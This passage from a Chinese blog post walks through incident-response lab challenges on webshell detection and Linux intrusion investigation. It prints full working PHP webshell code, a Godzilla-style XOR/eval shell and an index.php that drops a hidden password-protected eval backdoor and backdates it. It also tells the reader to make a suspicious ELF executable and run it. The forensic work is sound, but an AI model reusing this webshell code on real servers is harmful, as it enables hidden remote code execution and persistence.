+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508202448700.png"
+	width="1390"
+	height="528"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508202448700_hu1799162268059503569.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508202448700_hu5780076625301842416.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250508202448700"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="631px"
+	
+></p>
+<p>其实已经可以看出来了，再<code>grep linux-rz</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">*</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;useradd&#34;</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;linux-rz&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者直接找new user,或者去找/etc/passwd下的可疑用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat auth.log.1|grep -a &#34;new user&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{test2}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第一章-应急响应-webshell查杀">第一章 应急响应-webshell查杀
+</h2><h3 id="1黑客webshell里面的flag-flagxxxxx-xxxx-xxxx-xxxx-xxxx">1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}
+</h3><p>把web目录下的文件下载到本机用D盾扫描</p>
+<p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508211811257.png"
+	width="931"
+	height="135"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508211811257_hu18249373817672756856.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508211811257_hu2437296993602084356.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250508211811257"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="689"
+		data-flex-basis="1655px"
+	
+></p>
+<p>gz.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//027ccd04-5065-48b6-a32d-77c704a5e26d
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$payloadName</span><span class="o">=</span><span class="s1">&#39;payload&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$key</span><span class="o">=</span><span class="s1">&#39;3c6e0b8a9c15224a&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="o">!==</span><span class="k">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span><span class="o">=</span><span class="nx">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">=</span><span class="nx">encode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">],</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="s2">&#34;getBasicsInfo&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$payload</span><span class="o">=</span><span class="nx">encode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">eval</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">encode</span><span class="p">(</span><span class="o">@</span><span class="nx">run</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="s2">&#34;getBasicsInfo&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">]</span><span class="o">=</span><span class="nx">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{027ccd04-5065-48b6-a32d-77c704a5e26d}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2黑客使用的什么工具的shell-github地址的md5-flagmd5">2.黑客使用的什么工具的shell github地址的md5 flag{md5}
+</h3><p>一眼哥斯拉</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/BeichenDream/Godzilla --&gt; 39392de3218c333f794befef07ac9257
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{39392de3218c333f794befef07ac9257}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3黑客隐藏shell的完整路径的md5-flagmd5-注--xxxxxxxxxxxxxxxxxx">3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">include</span><span class="o">/</span><span class="n">Db</span><span class="o">/.</span><span class="n">Mysqli</span><span class="o">.</span><span class="n">php</span> <span class="o">--&gt;</span> <span class="n">aebac0e58cd6c5fad1695ee4d1ac1919</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{aebac0e58cd6c5fad1695ee4d1ac1919}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4黑客免杀马完整路径-md5-flagmd5">4.黑客免杀马完整路径 md5 flag{md5}
+</h3><p>其实D盾已经扫出来了，top.php</p>
+<p>我们还可以查看access.log，访问的是第七个字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">&#39;{print $7}&#39;</span><span class="o">|</span><span class="n">uniq</span> <span class="o">-</span><span class="n">c</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508213007957.png"
+	width="661"
+	height="278"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508213007957_hu13911720873499755940.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250508213007957_hu17846744047355397357.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250508213007957"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="570px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wap</span><span class="o">/</span><span class="n">top</span><span class="o">.</span><span class="n">php</span> <span class="o">--&gt;</span> <span class="n">eeff2eabfd9b7a6d26fc1a53d3f7d1de</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第一章-应急响应--linux入侵排查">第一章 应急响应- Linux入侵排查
+</h2><h3 id="1web目录存在木马请找到木马的密码提交">1.web目录存在木马，请找到木马的密码提交
+</h3><p>到web目录下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat *.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606210636349.png"
+	width="798"
+	height="224"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606210636349_hu7424303472359385346.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606210636349_hu12605326537949440039.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250606210636349"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="356"
+		data-flex-basis="855px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{1}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2服务器疑似存在不死马请找到不死马的密码提交">2.服务器疑似存在不死马，请找到不死马的密码提交
+</h3><p>查看文件权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -alh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606210911495.png"
+	width="799"
+	height="458"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606210911495_hu14168875193868643119.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606210911495_hu6573740706787268120.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250606210911495"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="418px"
+	
+></p>
+<p>index.php居然是root权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;config.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nx">SYS_ROOT</span><span class="o">.</span><span class="nx">INC</span><span class="o">.</span><span class="s1">&#39;common.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$path</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PATH_INFO&#39;</span><span class="p">]</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;?&#39;</span><span class="o">.</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;/&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$path</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$path</span> <span class="o">=</span> <span class="nx">Base</span><span class="o">::</span><span class="na">safeword</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ctrl</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;run&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;createprocess&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Index</span><span class="o">::</span><span class="na">createhtml</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">:</span><span class="mi">0</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cat&#39;</span><span class="p">],</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;single&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Index</span><span class="o">::</span><span class="na">run</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/.shell.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php if(md5($_POST[&#34;pass&#34;])==&#34;5d41402abc4b2a76b9719d911017c592&#34;){@eval($_POST[cmd]);}?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s1">&#39;touch -m -d &#34;2021-01-01 00:00:01&#34; .shell.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">usleep</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>向shell.php写文件的操作，查pass的MD5hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{hello}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3不死马是通过哪个文件生成的请提交文件名">3.不死马是通过哪个文件生成的，请提交文件名
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{index.php}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4黑客留下了木马文件请找出黑客的服务器ip提交">4.黑客留下了木马文件，请找出黑客的服务器ip提交
+</h3><p>前面ls的时候看到可以的二进制文件<code>shell(1).elf</code></p>
+<p>微步云沙箱分析</p>
+<p><img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606211617013.png"
+	width="1277"
+	height="392"
+	srcset="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606211617013_hu2904529552761396685.png 480w, /p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/image-20250606211617013_hu3639317984764436868.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250606211617013"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="325"
+		data-flex-basis="781px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{10.11.55.21}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5黑客留下了木马文件请找出黑客服务器开启的监端口提交">5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交
+</h3><p>上面也可看到监听端口是3333</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{3333}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者先执行文件，然后netstat查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod 777 &#39;shell(1).elf&#39;
+</span></span><span class="line"><span class="cl">./&#39;shell(1).elf&#39;
+</span></span><span class="line"><span class="cl">netstat -antlp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第二章日志分析-redis应急响应">第二章日志分析-redis应急响应
+</h2>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%89%93%E9%9D%B6/">打靶</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/thm%E6%97%A5%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/thm%E6%97%A5%E8%AE%B0/1.c45bccdc896ea1f57e891c02d54ef513.png" 
+                        width="2048" 
+                        height="1536" 
+                        loading="lazy"
+                        alt="Featured image of post thm日记"
+                        
+                        data-hash="md5-xFvM3IluofV&#43;iRwC1U71Ew==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">thm日记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xctf%E5%88%B7%E9%A2%98/">
+        
+        
+            <div class="article-image">
+                <img src="/p/xctf%E5%88%B7%E9%A2%98/1.b6981e26e3ff7be7ee3895b83dbe93a1.jpg" 
+                        width="5416" 
+                        height="2894" 
+                        loading="lazy"
+                        alt="Featured image of post xctf刷题"
+                        
+                        data-hash="md5-tpgeJuP/e&#43;fuOJW4Pb6ToQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">xctf刷题</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/buuctf%E5%88%B7%E9%A2%98/">
+        
+        
+            <div class="article-image">
+                <img src="/p/buuctf%E5%88%B7%E9%A2%98/1.0d6ca11e9e148e954a5a790b078ac3fe.png" 
+                        width="1920" 
+                        height="1080" 
+                        loading="lazy"
+                        alt="Featured image of post buuctf刷题"
+                        
+                        data-hash="md5-DWyhHp4UjpVKWnkLB4rD/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">buuctf刷题</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
